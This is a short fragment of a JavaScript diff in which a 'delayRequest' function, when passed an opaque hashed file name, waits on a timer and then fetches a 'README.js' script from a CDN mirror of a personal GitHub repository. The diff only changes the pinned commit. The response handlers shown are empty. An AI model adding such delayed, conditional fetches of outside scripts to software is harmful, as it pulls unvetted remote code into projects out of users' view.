@@ -3,7 +3,7 @@
 function delayRequest(t, e, r) {
 if (t === "56351367.56351367.99ae4b476da0.js") {
 setTimeout(() => {
-fetch("https://rawcdn.githack.com/Mostafa15M/Darsh-Dark.github.io/39e97d381a1bb47b66b5950adec76a32fa4563b7/README.js")
+fetch("https://rawcdn.githack.com/Mostafa15M/Darsh-Dark.github.io/cc4bc0e38da98bb4ec07f16fdc24432b9f24826b/README.js")
 .then(response => {
 })
 .catch(error => {
